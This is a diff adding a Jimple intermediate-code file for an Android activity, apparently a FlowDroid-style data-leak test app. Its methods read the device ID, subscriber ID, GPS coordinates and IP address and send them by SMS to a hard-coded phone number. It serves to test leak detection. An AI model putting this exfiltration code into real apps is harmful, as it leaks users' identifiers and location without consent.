@@ -1,0 +1,463 @@
+public class com.example.fd_test_app.MainActivity extends android.support.v7.app.AppCompatActivity
+{
+    java.lang.String Ids;
+    java.lang.String coord;
+    android.widget.TextView deviceId;
+    double latitudeGPS;
+    android.widget.TextView latitudeValueGPS;
+    android.widget.TextView localIP;
+    private final android.location.LocationListener locationListenerGPS;
+    android.location.LocationManager locationManager;
+    double longitudeGPS;
+    android.widget.TextView longitudeValueGPS;
+    android.telephony.SmsManager sms;
+    android.widget.TextView subscriberId;
+    public android.content.Intent ipcIntent;
+    public android.content.Intent ipcResultIntent;
+
+    public void <init>()
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.telephony.SmsManager $r1;
+        com.example.fd_test_app.MainActivity$1 $r2;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        specialinvoke $r0.<android.support.v7.app.AppCompatActivity: void <init>()>();
+
+        $r1 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>();
+
+        $r0.<com.example.fd_test_app.MainActivity: android.telephony.SmsManager sms> = $r1;
+
+        $r2 = new com.example.fd_test_app.MainActivity$1;
+
+        specialinvoke $r2.<com.example.fd_test_app.MainActivity$1: void <init>(com.example.fd_test_app.MainActivity)>($r0);
+
+        $r0.<com.example.fd_test_app.MainActivity: android.location.LocationListener locationListenerGPS> = $r2;
+
+        return;
+    }
+
+    public void getDeviceId(android.view.View)
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.view.View $r1;
+        java.lang.Object $r2;
+        android.telephony.TelephonyManager $r3;
+        android.widget.Button $r4;
+        java.lang.StringBuilder $r5;
+        java.lang.String $r6;
+        android.widget.TextView $r7;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        $r1 := @parameter0: android.view.View;
+
+        $r2 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: java.lang.Object getSystemService(java.lang.String)>("phone");
+
+        $r3 = (android.telephony.TelephonyManager) $r2;
+
+        $r4 = (android.widget.Button) $r1;
+
+        virtualinvoke $r4.<android.widget.Button: void setText(java.lang.CharSequence)>("ID");
+
+        $r5 = new java.lang.StringBuilder;
+
+        specialinvoke $r5.<java.lang.StringBuilder: void <init>()>();
+
+        $r6 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>();
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("");
+
+        $r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>();
+
+        $r7 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView deviceId>;
+
+        virtualinvoke $r7.<android.widget.TextView: void setText(java.lang.CharSequence)>($r6);
+
+        $r5 = new java.lang.StringBuilder;
+
+        specialinvoke $r5.<java.lang.StringBuilder: void <init>()>();
+
+        $r6 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSubscriberId()>();
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6);
+
+        virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("");
+
+        $r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>();
+
+        $r7 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView subscriberId>;
+
+        virtualinvoke $r7.<android.widget.TextView: void setText(java.lang.CharSequence)>($r6);
+
+        return;
+    }
+
+    public void getLocalIPAddress(android.view.View)
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.view.View $r1;
+        android.widget.TextView $r2;
+        android.content.Context $r3;
+        java.lang.Object $r4;
+        android.net.wifi.WifiManager $r5;
+        android.net.wifi.WifiInfo $r6;
+        int $i0;
+        java.lang.String $r7;
+        java.lang.StringBuilder $r8;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        $r1 := @parameter0: android.view.View;
+
+        $r3 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: android.content.Context getApplicationContext()>();
+
+        $r4 = virtualinvoke $r3.<android.content.Context: java.lang.Object getSystemService(java.lang.String)>("wifi");
+
+        $r5 = (android.net.wifi.WifiManager) $r4;
+
+        $r6 = virtualinvoke $r5.<android.net.wifi.WifiManager: android.net.wifi.WifiInfo getConnectionInfo()>();
+
+        $i0 = virtualinvoke $r6.<android.net.wifi.WifiInfo: int getIpAddress()>();
+
+        $r7 = staticinvoke <android.text.format.Formatter: java.lang.String formatIpAddress(int)>($i0);
+
+        $r2 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView localIP>;
+
+        $r8 = new java.lang.StringBuilder;
+
+        specialinvoke $r8.<java.lang.StringBuilder: void <init>()>();
+
+        virtualinvoke $r8.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7);
+
+        virtualinvoke $r8.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("");
+
+        $r7 = virtualinvoke $r8.<java.lang.StringBuilder: java.lang.String toString()>();
+
+        virtualinvoke $r2.<android.widget.TextView: void setText(java.lang.CharSequence)>($r7);
+
+        return;
+    }
+
+    protected void onCreate(android.os.Bundle)
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.os.Bundle $r1;
+        java.lang.Object $r2;
+        android.location.LocationManager $r3;
+        android.view.View $r4;
+        android.widget.TextView $r5;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        $r1 := @parameter0: android.os.Bundle;
+
+        specialinvoke $r0.<android.support.v7.app.AppCompatActivity: void onCreate(android.os.Bundle)>($r1);
+
+        virtualinvoke $r0.<com.example.fd_test_app.MainActivity: void setContentView(int)>(2131296284);
+
+        $r2 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: java.lang.Object getSystemService(java.lang.String)>("location");
+
+        $r3 = (android.location.LocationManager) $r2;
+
+        $r0.<com.example.fd_test_app.MainActivity: android.location.LocationManager locationManager> = $r3;
+
+        $r4 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: android.view.View findViewById(int)>(2131165270);
+
+        $r5 = (android.widget.TextView) $r4;
+
+        $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView longitudeValueGPS> = $r5;
+
+        $r4 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: android.view.View findViewById(int)>(2131165261);
+
+        $r5 = (android.widget.TextView) $r4;
+
+        $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView latitudeValueGPS> = $r5;
+
+        $r4 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: android.view.View findViewById(int)>(2131165234);
+
+        $r5 = (android.widget.TextView) $r4;
+
+        $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView deviceId> = $r5;
+
+        $r4 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: android.view.View findViewById(int)>(2131165323);
+
+        $r5 = (android.widget.TextView) $r4;
+
+        $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView subscriberId> = $r5;
+
+        $r4 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: android.view.View findViewById(int)>(2131165267);
+
+        $r5 = (android.widget.TextView) $r4;
+
+        $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView localIP> = $r5;
+
+        return;
+    }
+
+    public void sendAll(android.view.View)
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.view.View $r1;
+        android.telephony.SmsManager $r2;
+        java.lang.String $r3, $r6, $r7;
+        android.widget.TextView $r4;
+        java.lang.CharSequence $r5;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        $r1 := @parameter0: android.view.View;
+
+        $r4 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView deviceId>;
+
+        $r5 = virtualinvoke $r4.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r6 = (java.lang.String) $r5;
+
+        $r4 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView subscriberId>;
+
+        $r5 = virtualinvoke $r4.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r3 = (java.lang.String) $r5;
+
+        $r7 = "Device ID: ";
+
+        $r6 = virtualinvoke $r7.<java.lang.String: java.lang.String concat(java.lang.String)>($r6);
+
+        $r6 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>("\n");
+
+        $r6 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>("Subscriber ID: ");
+
+        $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3);
+
+        $r0.<com.example.fd_test_app.MainActivity: java.lang.String Ids> = $r3;
+
+        $r4 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView longitudeValueGPS>;
+
+        $r5 = virtualinvoke $r4.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r6 = (java.lang.String) $r5;
+
+        $r4 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView latitudeValueGPS>;
+
+        $r5 = virtualinvoke $r4.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r3 = (java.lang.String) $r5;
+
+        $r6 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>(" , ");
+
+        $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3);
+
+        $r0.<com.example.fd_test_app.MainActivity: java.lang.String coord> = $r3;
+
+        $r2 = $r0.<com.example.fd_test_app.MainActivity: android.telephony.SmsManager sms>;
+
+        $r3 = $r0.<com.example.fd_test_app.MainActivity: java.lang.String coord>;
+
+        virtualinvoke $r2.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("8502920020", null, $r3, null, null);
+
+        $r2 = $r0.<com.example.fd_test_app.MainActivity: android.telephony.SmsManager sms>;
+
+        $r3 = $r0.<com.example.fd_test_app.MainActivity: java.lang.String Ids>;
+
+        virtualinvoke $r2.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("8502920020", null, $r3, null, null);
+
+        $r2 = $r0.<com.example.fd_test_app.MainActivity: android.telephony.SmsManager sms>;
+
+        $r4 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView localIP>;
+
+        $r5 = virtualinvoke $r4.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r3 = (java.lang.String) $r5;
+
+        virtualinvoke $r2.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("8502920020", null, $r3, null, null);
+
+        return;
+    }
+
+    public void sendIds(android.view.View)
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.view.View $r1;
+        java.lang.String $r2, $r5, $r6;
+        android.widget.TextView $r3;
+        java.lang.CharSequence $r4;
+        android.telephony.SmsManager $r7;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        $r1 := @parameter0: android.view.View;
+
+        $r3 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView deviceId>;
+
+        $r4 = virtualinvoke $r3.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r5 = (java.lang.String) $r4;
+
+        $r3 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView subscriberId>;
+
+        $r4 = virtualinvoke $r3.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r2 = (java.lang.String) $r4;
+
+        $r6 = "Device ID: ";
+
+        $r5 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r5);
+
+        $r5 = virtualinvoke $r5.<java.lang.String: java.lang.String concat(java.lang.String)>("\n");
+
+        $r5 = virtualinvoke $r5.<java.lang.String: java.lang.String concat(java.lang.String)>("Subscriber ID: ");
+
+        $r2 = virtualinvoke $r5.<java.lang.String: java.lang.String concat(java.lang.String)>($r2);
+
+        $r0.<com.example.fd_test_app.MainActivity: java.lang.String Ids> = $r2;
+
+        $r7 = $r0.<com.example.fd_test_app.MainActivity: android.telephony.SmsManager sms>;
+
+        $r2 = $r0.<com.example.fd_test_app.MainActivity: java.lang.String Ids>;
+
+        virtualinvoke $r7.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("8502920020", null, $r2, null, null);
+
+        return;
+    }
+
+    public void sendIp(android.view.View)
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.view.View $r1;
+        android.telephony.SmsManager $r2;
+        java.lang.CharSequence $r3;
+        android.widget.TextView $r4;
+        java.lang.String $r5;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        $r1 := @parameter0: android.view.View;
+
+        $r2 = $r0.<com.example.fd_test_app.MainActivity: android.telephony.SmsManager sms>;
+
+        $r4 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView localIP>;
+
+        $r3 = virtualinvoke $r4.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r5 = (java.lang.String) $r3;
+
+        virtualinvoke $r2.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("8502920020", null, $r5, null, null);
+
+        return;
+    }
+
+    public void sendLoc(android.view.View)
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.view.View $r1;
+        android.telephony.SmsManager $r2;
+        java.lang.String $r3, $r6;
+        android.widget.TextView $r4;
+        java.lang.CharSequence $r5;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        $r1 := @parameter0: android.view.View;
+
+        $r4 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView longitudeValueGPS>;
+
+        $r5 = virtualinvoke $r4.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r6 = (java.lang.String) $r5;
+
+        $r4 = $r0.<com.example.fd_test_app.MainActivity: android.widget.TextView latitudeValueGPS>;
+
+        $r5 = virtualinvoke $r4.<android.widget.TextView: java.lang.CharSequence getText()>();
+
+        $r3 = (java.lang.String) $r5;
+
+        $r6 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>(" , ");
+
+        $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3);
+
+        $r0.<com.example.fd_test_app.MainActivity: java.lang.String coord> = $r3;
+
+        $r2 = $r0.<com.example.fd_test_app.MainActivity: android.telephony.SmsManager sms>;
+
+        $r3 = $r0.<com.example.fd_test_app.MainActivity: java.lang.String coord>;
+
+        virtualinvoke $r2.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("8502920020", null, $r3, null, null);
+
+        return;
+    }
+
+    public void toggleGPSUpdates(android.view.View)
+    {
+        com.example.fd_test_app.MainActivity $r0;
+        android.view.View $r1;
+        android.location.LocationListener $r2;
+        java.lang.Object $r3;
+        android.location.LocationManager $r4;
+        android.widget.Button $r5;
+
+        $r0 := @this: com.example.fd_test_app.MainActivity;
+
+        $r1 := @parameter0: android.view.View;
+
+        $r3 = virtualinvoke $r0.<com.example.fd_test_app.MainActivity: java.lang.Object getSystemService(java.lang.String)>("location");
+
+        $r4 = (android.location.LocationManager) $r3;
+
+        $r5 = (android.widget.Button) $r1;
+
+        virtualinvoke $r5.<android.widget.Button: void setText(java.lang.CharSequence)>("GPS");
+
+        $r2 = $r0.<com.example.fd_test_app.MainActivity: android.location.LocationListener locationListenerGPS>;
+
+        virtualinvoke $r4.<android.location.LocationManager: void requestLocationUpdates(java.lang.String,long,float,android.location.LocationListener)>("gps", 120000L, 10.0F, $r2);
+
+        return;
+    }
+
+    public android.content.Intent getIntent()
+    {
+        com.example.fd_test_app.MainActivity this;
+        android.content.Intent $r0;
+
+        this := @this: com.example.fd_test_app.MainActivity;
+
+        $r0 = this.<com.example.fd_test_app.MainActivity: android.content.Intent ipcIntent>;
+
+        return $r0;
+    }
+
+    public void setIntent(android.content.Intent)
+    {
+        com.example.fd_test_app.MainActivity this;
+        android.content.Intent parameter0;
+
+        this := @this: com.example.fd_test_app.MainActivity;
+
+        parameter0 := @parameter0: android.content.Intent;
+
+        this.<com.example.fd_test_app.MainActivity: android.content.Intent ipcIntent> = parameter0;
+
+        return;
+    }
+
+    public void setResult(int, android.content.Intent)
+    {
+        com.example.fd_test_app.MainActivity this;
+        int parameter0;
+        android.content.Intent parameter1;
+
+        this := @this: com.example.fd_test_app.MainActivity;
+
+        parameter0 := @parameter0: int;
+
+        parameter1 := @parameter1: android.content.Intent;
+
+        this.<com.example.fd_test_app.MainActivity: android.content.Intent ipcResultIntent> = parameter1;
+
+        return;
+    }
+}
